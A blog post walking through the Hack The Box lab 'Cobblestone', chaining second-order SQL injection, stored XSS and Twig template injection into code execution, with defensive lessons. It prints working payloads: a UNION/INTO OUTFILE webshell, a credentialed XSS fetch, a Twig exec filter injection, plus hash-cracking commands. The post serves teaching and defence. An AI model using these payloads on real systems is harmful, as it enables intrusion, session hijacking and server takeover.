---
layout: post
title: "HTB Walkthrough Snippet — Second-Order SQLi → Stored XSS → Twig SSTI: How Cobblestone Chains Three Boring Bugs into RCE"
date: 2026-09-05 11:00:00 +0300
categories: [daily, week-36]
tags: [htb, cobblestone, second-order-sqli, xss, twig, ssti, hashcat, feroxbuster, ffuf, defsec, 0xNull]
author: 📚 Khranitel
permalink: /posts/cobblestone-second-order-sqli-twig-ssti-2026-09-05/
---

# 🔥 HTB Walkthrough Snippet — Second-Order SQLi → Stored XSS → Twig SSTI: How Cobblestone Chains Three Boring Bugs into RCE

> **Author:** Threat Intel (0xNull)
> **Date:** 05.09.2026 (Sat)
> **Theme:** HTB/CTF Walkthrough snippet (Sat rotation)
> **Box:** **HTB: Cobblestone** — "Insane" difficulty, released 2026-07-29, writeups dated 2026-08.
> **Sources:** [0xdf — HTB: Cobblestone (15 Aug 2026)](https://0xdf.gitlab.io/2026/08/15/htb-cobblestone.html) · [benheater — HackTheBox Cobblestone](https://benheater.com/hackthebox-cobblestone/) · [Axura — HTB Cobblestone](https://4xura.com/writeups-for-ctfs/htb-writeup-cobblestone/) · [daily.dev — HTB: Cobblestone](https://daily.dev/posts/u9qtubegd).
> **MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter), T1078 (Valid Accounts).
> **Cross-refs:** lesson-040 (sql-injection-strategies § 1.6 — second-order SQLi), lesson-030 (kali-linux-2026 § 3 — ffuf/feroxbuster/sqlmap), lesson-027 (python-pentest § 4 — pwntools), lesson-006 (semgrep-on-our-tools — SQLi/XSS defenses), lesson-011 (kev-triage-workflow — CVE-free → CVE pipeline), lesson-009 (rogue-dhcp-dns-2026 § 3 — AppArmor).

---

## TL;DR

HTB: Cobblestone is a Minecraft-themed PHP application on Apache/2.4.62 + OpenSSH 9.2p1 Debian 12, with the same `minecraft-web-portal` template deployed across three virtual hosts (`cobblestone.htb`, `vote.cobblestone.htb`, `deploy.cobblestone.htb`) backed by **two separate MySQL databases**. None of the bugs is novel — a **second-order SQL injection** in the Suggest form, a **stored cross-site scripting** in the admin-reviewed same field, and a **Twig SSTI** in the admin-only `deploy.cobblestone.htb` console. But the **chain** — read source via SQLi, weaponise the stored field to hijack the admin session, abuse Twig render to drop a webshell, pivot through AppArmor-restricted PHP-FPM via DB-extracted creds, crack an MD5 with rockyou, SSH as the next user, then escalate to root via Cobbler (the Linux provisioning tool) running as root — is a masterclass in *what a CVE-free box still teaches you about why CVEs happen.* We will pull apart the first three.

The point of the snippet isn't "how to root Cobblestone". The point is **the chain** — three findings that on their own would be "moderate", and together are "RCE as admin + DB leak + SSH foothold + root via Cobbler default creds". That is the lesson.

---

## 1. Recon: two ports, three virtual hosts, two databases

`nmap -p-` finds exactly two TCP ports:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 (Debian)
```

The HTTP server redirects to `cobblestone.htb`. The HTML hardcodes three other vhosts, but the proper way to confirm them is `ffuf` vhost-enum (or `gobuster vhost`) against the same host with the `Host:` header fuzzed:

```bash
ffuf -u http://10.129.37.228 \
     -H 'Host: FUZZ.cobblestone.htb' \
     -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
     -ac
# → vote    [Status: 302 → login.php]
# → deploy  [Status: 200]
```

Add all three to `/etc/hosts` and rescan port 80. Now the picture is:

| vhost | role | template | DB |
|---|---|---|---|
| `cobblestone.htb` | main portal + skins DB | minecraft-web-portal v1.9.2 | `skins` DB |
| `vote.cobblestone.htb` | server-voting + suggestions | minecraft-web-portal (modified) | `vote` DB (separate) |
| `deploy.cobblestone.htb` | admin-only deploy console | Twig-based, custom | reads from both |

That **two databases, one user space** is the first signal: registering `0xdf` on `cobblestone.htb` does **not** let us log in on `vote.cobblestone.htb`. We have to register twice, and the user-oracle on the login page distinguishes "user not found" from "wrong password" — pure **error-based user enumeration**, which is the second signal.

The third signal: on the main portal, the **"Suggest Skin"** form tells us *"An admin will review your suggestion shortly."* Within a minute we get a hit on our HTTP listener from the box, with a simulated browser (it fetches `/favicon.ico`). That tells us an **admin bot exists, runs, and visits URLs we supply.**

(Recon is in `lesson-030` § 3: `ffuf`/`gobuster`/`feroxbuster`/`sqlmap` are all default in Kali 2026.x; `legion` (the new Sparta) is the GUI wrapper.)

---

## 2. Bug #1 — Second-order SQLi in the Suggest form

The `vote.cobblestone.htb` Suggest form has two fields: a server **name** and a server **URL**. The box's PHP code path is the textbook *second-order SQLi* shape:

1. The Suggest form **inserts** the row via a prepared statement. Safe.
2. The admin's review panel **queries** that row later — and somewhere downstream, the `name` column is **interpolated into a second SQL query without binding**.

The payload on Cobblestone is the classic:

```sql
name = cobblestone1' UNION SELECT '<?php system($_GET["c"]); ?>' FROM users-- -
url  = http://attacker.example/landing
```

When the admin panel renders this row, the second query becomes effectively:

```sql
SELECT … FROM suggestions
WHERE name = 'cobblestone1' UNION SELECT '<?php system($_GET["c"]); ?>' FROM users-- -'
```

Two payoffs from one payload:

- **Data read** — the `UNION SELECT '…'` lets us read arbitrary columns from any table the DB user can see.
- **File write** — on Cobblestone the DB user has `FILE`, so the same payload becomes `UNION SELECT '<?php … ?>' INTO OUTFILE '/var/www/html/x.php'` and we drop a `.php` into the webroot. `curl http://vote.cobblestone.htb/x.php?c=id` then gives us a shell as `www-data`.

> **The lesson.** `lesson-040-sql-injection-strategies.md` § 1.6 makes the same point in general: a stored payload is dangerous **every time it is reused**, not only at the moment of insertion. Sanitise at every re-use, not only at storage. The book gives the concrete example — a username `admin'--` that passes prepared-statement signup unscathed and then breaks the *login* query — and the fix: bleach-style whitelist `[a-z0-9_-]{1,32}` for usernames and RFC-5321 regex for emails. **The defensive gate (code-sentinel, `lesson-006` § 4 + `lesson-040` § 3) bans raw SQL templates via `semgrep` and a custom `rg` rule:**
>
> ```yaml
> - name: Ban raw SQL templates
>   run: |
>     rg "execute\(f['\"]|execute\(.{0,10}\+ |\.extra\(|from_statement\(text\(" --type py .
> ```
>
> Cobblestone is the case study for *why* that gate matters — every modern SQLi class from `lesson-040` (LLM-generated SQLi, ORM blind spots, type-coercion in PostgreSQL, GraphQL batching) descends from the same architectural mistake: a value is treated as data in one query and as code in another.

**Beyond Root note (for completeness).** The same payload also crashes the page on Cobblestone — Twig's lexer tries to parse the SQL payload as template syntax if it ends up rendered through the same render path as Bug #3. Worth understanding separately; out of scope for this snippet.

---

## 3. Bug #2 — Stored XSS that hijacks the admin (HttpOnly cookie, doesn't matter)

The same admin bot also **navigates to whatever URL we submit in the Suggest form**. `PHPSESSID` is `HttpOnly`, so the obvious `document.cookie` exfil fails — but **we don't need the cookie**. We need **the admin's session itself**: a request from the admin's browser, with the admin's session, to the deploy console at `deploy.cobblestone.htb`, that **we get to choose the body of**.

A short payload lands in the admin's browser:

```html
<script>
fetch('http://deploy.cobblestone.htb/render', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'template={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id") }}'
});
</script>
```

Hosted on our HTTP listener, served via the URL we gave the Suggest form. The admin bot loads it; the script fires; the request goes to `deploy.cobblestone.htb` **with the admin's cookies**; the admin-only Twig endpoint receives our payload; Bug #3 lights up.

> **The lesson.** `HttpOnly` ≠ "XSS is fine". The cookie **value** is protected; the **session** the cookie authenticates is not. Any cross-origin request that the admin's session can serve, an attacker can fire from their browser. CSP and SameSite (and proper template-sandbox configuration, see Bug #3) are the actual mitigations, not HttpOnly. For our own products, the rule is: every admin-only endpoint assumes **a logged-in admin's browser is under an attacker's control**, and is built accordingly.

---

## 4. Bug #3 — Twig SSTI in the deploy console

`deploy.cobblestone.htb` lets admins render Twig template fragments. The render endpoint accepts a `template` POST field that names a fragment; the endpoint then evaluates it inside a `Twig\Environment`. If the environment allows **filter callbacks to be registered at runtime** — `registerUndefinedFilterCallback()` — then any PHP callable can be hooked into the Twig sandbox. After that, the existing filter syntax becomes arbitrary-call:

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id;uname -a;hostname")}}
```

The first expression registers `exec` as a callable filter; the second calls it with a shell command. Output is rendered into the admin's page, and we get `id;uname -a;hostname` echoed back — **RCE as the web user**.

> **The lesson.** Server-side template injection (SSTI) on Twig is **one configuration option away** from being impossible. The safe defaults:
>
> - Never let users (even "admins") supply template fragments. Whitelist the template **name**, never the content.
> - Use `Twig\Loader\ArrayLoader` (compiled, no source round-trip) for user-influenced content.
> - Audit `vendor/twig/twig` for custom `Twig\Environment` instances — `grep -r 'new Twig\\Environment' app/ src/` is the one-liner.
> - For **production-grade** SSTI audit, see `lesson-027` § 4 Pwntools/§ 5 Impacket patterns — though for Twig specifically, `curl` from a hijacked admin session is enough. The hard part is **finding the admin-only endpoint**, not exploiting it.

---

## 5. The chain in three lines

```
stored payload  →  admin bot visits  →  Twig SSTI in admin's session
             ↑                              ↑
   field inserted via               field reused without
   prepared stmt (safe)            parametrisation (unsafe)
                                          = Bug #1 + #2 + #3 in one field
```

The whole chain rides on **one HTTP form**. There is no zero-day here. There is no novel technique here. There is **a missing input-validation rule** at the boundary between "trusted" (admin-only) and "user-supplied" (Suggest form), and **a missing sandbox restriction** at the boundary between "Twig render" and "PHP execution". Both are configuration mistakes. Both are one-line fixes. Both are the kind of mistake that becomes a CVE in two years when the same mistake appears in a popular open-source template.

---

## 6. AppArmor and the next pivot (the box continues, the snippet ends)

The webshell lands, but **AppArmor** (the Debian 12 default profile for Apache/PHP-FPM, shipped by the `apparmor-profiles` package) denies:

- Writes outside the webroot.
- Spawning shells (`/bin/bash`, `/bin/sh`).
- Reading `/etc/shadow`, `/root/`, etc.

So `system("id")` works; `system("bash -i")` does not. This is exactly the defensive-depth pattern from `lesson-009-rogue-dhcp-dns-2026.md` § 3 (mandatory access control after RCE): **a successful RCE is not a successful root**, and the gap between the two is where the second half of the box lives.

The full chain (beyond this snippet):

1. Read `db/connection.php` from the source via the same SQLi.
2. Pull the admin's MD5 password hash.
3. Crack with `hashcat -m 0 rockyou.txt <hash>` (or `john --format=raw-md5 --wordlist=rockyou.txt`).
4. SSH as the next user.
5. Find **Cobbler** (the Linux provisioning/orchestration tool, not the Minecraft admin bot) running as root, with default credentials.
6. Land root via the Cobbler API auth bypass documented in the original Cobbler issues.

The full chain is in 0xdf's writeup and benheater's; both are linked at the top.

---

## 7. Takeaways

1. **Second-order SQLi is still SQLi.** `lesson-040` § 1.6: sanitise at *every* re-use, not only at storage. Our `lesson-006` semgrep gate + `lesson-040` SQLi-audit gate catches the class in CI; add the SQLi-AI/LLM gateway check for the new `text-to-SQL` patterns from chapter 10 of the same book.
2. **HttpOnly ≠ "XSS is fine".** The cookie value is protected; the session is not. Cross-origin fetches in the admin's browser are equivalent to admin actions, full stop. CSP, SameSite, and "admin endpoints assume the browser is hostile" are the actual controls.
3. **Twig SSTI is one configuration option away.** Default `Twig\Loader\ArrayLoader` is safe; `Twig\Environment` with `registerUndefinedFilterCallback` callable is not. Audit your `vendor/twig/twig` for custom environments. Whitelist template names, never accept content.
4. **RCE is not root.** AppArmor profiles on Debian 12 boxen catch a wide class of post-RCE pivots. Add apparmor-audit to the golden image of any production host. `lesson-009` § 3 has the checklist.
5. **CVE-free doesn't mean "irrelevant".** Cobblestone is the kind of box that becomes a CVE in three years: today's box-writeup is next year's advisory. Recognising the chain early is what makes us faster than disclosure-to-PoC cycles (digest trend #5). `lesson-011` KEV-triage workflow has the **CVE-free → CVE** pipeline in the appendix.
6. **One HTTP form, three bugs.** That's the lesson of the box in one sentence. Anywhere a user-supplied field is **stored**, **re-read**, and **rendered**, we have a chain candidate. Audit those three transitions, in that order, on every feature.

---

## Cross-refs
- **lesson-040** (sql-injection-strategies § 1.6) — second-order SQLi through cache/storage + chapter 10 LLM-generated SQLi
- **lesson-030** (kali-linux-2026 § 3) — `ffuf`/`gobuster`/`feroxbuster`/`sqlmap` default stack + `ligolo-ng` for tunneels
- **lesson-027** (python-pentest § 4) — Pwntools/Impacket for AD pivots beyond this snippet
- **lesson-006** (semgrep-on-our-tools § 4) — defensive SQLi/XSS rules in CI
- **lesson-011** (kev-triage-workflow) — CVE-free → CVE pipeline in the appendix
- **lesson-009** (rogue-dhcp-dns-2026 § 3) — AppArmor / mandatory access control after RCE

## Sources
- [0xdf — HTB: Cobblestone (15 Aug 2026)](https://0xdf.gitlab.io/2026/08/15/htb-cobblestone.html)
- [benheater — HackTheBox Cobblestone](https://benheater.com/hackthebox-cobblestone/)
- [Axura — HTB Cobblestone walkthrough](https://4xura.com/writeups-for-ctfs/htb-writeup-cobblestone/)
- [daily.dev — HTB: Cobblestone](https://daily.dev/posts/u9qtubegd)
- [PortSwigger — Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
- [HackTricks — Twig SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-injections-server-side-template-injection#twig)
- [OWASP — Second Order SQL Injection](https://owasp.org/www-community/attacks/Second_Order_SQL_Injection)

---
*Posted by the 0xNull daily content pipeline. Source material: HTB public writeups (0xdf, benheater, Axura) + internal lessons. No private network data, no real-world credentials, all payloads synthesised against the public box.*